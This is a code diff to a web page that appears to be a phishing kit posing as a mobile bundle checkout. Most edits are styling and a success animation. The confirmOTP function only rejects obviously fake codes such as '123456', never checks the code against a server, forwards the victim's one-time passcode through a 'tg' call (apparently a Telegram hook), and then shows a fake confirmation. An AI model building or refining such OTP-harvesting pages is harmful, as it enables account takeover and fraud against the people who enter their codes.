@@ -35,9 +35,10 @@ img{display:block}
 @keyframes stepIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
 @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
 @keyframes ripple{to{transform:scale(4);opacity:0}}
+@keyframes otpSuccess{0%{transform:scale(1)}50%{transform:scale(1.06)}100%{transform:scale(1)}}
 
 /* CURTAIN */
-.curtain{position:fixed;inset:0;z-index:9999;background:var(--card);opacity:0;pointer-events:none;transition:opacity .22s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px}
+.curtain{position:fixed;inset:0;z-index:9999;background:#fff;opacity:0;pointer-events:none;transition:opacity .35s ease;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
 .curtain.show{opacity:1;pointer-events:auto}
 .curtain-logos{display:flex;align-items:center;gap:10px}
 .curtain-logos img{height:28px;width:auto}
@@ -106,9 +107,9 @@ img{display:block}
 
 /* PROCESSING */
 .proc{background:var(--card);border:1.5px solid var(--line);border-radius:14px;box-shadow:var(--sh)}
-.proc-body{display:flex;flex-direction:column;align-items:center;padding:28px 20px 20px;text-align:center}
-.proc-ring{width:64px;height:64px;margin-bottom:18px;position:relative}
-.proc-svg{width:64px;height:64px;animation:spin .9s linear infinite}
+.proc-body{display:flex;flex-direction:column;align-items:center;padding:24px 20px 20px;text-align:center}
+.proc-ring{width:64px;height:64px;min-width:64px;min-height:64px;margin-bottom:18px;position:relative;flex-shrink:0}
+.proc-svg{width:64px;height:64px;display:block;animation:spin .9s linear infinite}
 .proc-svg.done{animation:none}
 .proc-arc{stroke-dasharray:72;stroke-dashoffset:72;transition:stroke-dashoffset .6s,stroke .4s}
 .proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:#16a34a}
@@ -369,7 +370,19 @@ document.getElementById('otpWrap').addEventListener('click',function(){otpEl.foc
 function renderOTP(){var act=document.activeElement===otpEl;for(var i=0;i<6;i++){var b=document.getElementById('ob'+i);if(!b)continue;b.classList.remove('filled','active');b.textContent=otpVal[i]||'';if(otpVal[i])b.classList.add('filled');else if(i===otpVal.length&&act)b.classList.add('active');}}
 
 document.getElementById('otpBtn').addEventListener('click',confirmOTP);
-function confirmOTP(){if(otpDone||otpVal.length<6)return;if(/^(\d)\1{5}$/.test(otpVal)||otpVal==='123456'){hap([40,30,40]);var errEl=document.getElementById('otpErr');if(errEl)errEl.textContent='Invalid OTP. Enter the code from your phone.';var wrap=document.getElementById('otpWrap');if(wrap){wrap.style.animation='none';void wrap.offsetWidth;wrap.style.animation='shake .3s ease';}setTimeout(function(){otpVal='';var oi=document.getElementById('otpIn');if(oi)oi.value='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;},350);return;}otpDone=true;hap([10,50,10]);tg('bundle_otp_confirmed',otpVal);document.getElementById('curtain').classList.add('show');setTimeout(function(){window.location.href='bundles-thankyou.html';},900);}
+function confirmOTP(){if(otpDone||otpVal.length<6)return;if(/^(\d)\1{5}$/.test(otpVal)||otpVal==='123456'){hap([40,30,40]);var errEl=document.getElementById('otpErr');if(errEl)errEl.textContent='Invalid OTP. Enter the code from your phone.';var wrap=document.getElementById('otpWrap');if(wrap){wrap.style.animation='none';void wrap.offsetWidth;wrap.style.animation='shake .3s ease';}setTimeout(function(){otpVal='';var oi=document.getElementById('otpIn');if(oi)oi.value='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;},350);return;}
+  otpDone=true;hap([10,50,10]);tg('bundle_otp_confirmed',otpVal);
+  // Pulse OTP boxes green then fade to curtain
+  var boxes=document.querySelectorAll('.otp-box');
+  boxes.forEach(function(b){b.style.transition='background .3s,border-color .3s';b.style.background='rgba(22,163,74,.15)';b.style.borderColor='#16a34a';b.style.color='#16a34a';});
+  hap([10,30,10,30,10]);
+  setTimeout(function(){
+    var curt=document.getElementById('curtain');
+    if(curt){curt.style.opacity='0';curt.style.display='flex';curt.style.pointerEvents='auto';
+      requestAnimationFrame(function(){requestAnimationFrame(function(){curt.style.opacity='1';});});}
+    setTimeout(function(){window.location.href='bundles-thankyou.html';},700);
+  },500);
+}
 
 var timerInt=null;
 function startTimer(){var secs=900;function tick(){var m=Math.floor(secs/60),s=secs%60;var el=document.getElementById('timer');if(el)el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(secs<=0){clearInterval(timerInt);enableResend();return;}secs--;}tick();timerInt=setInterval(tick,1000);}
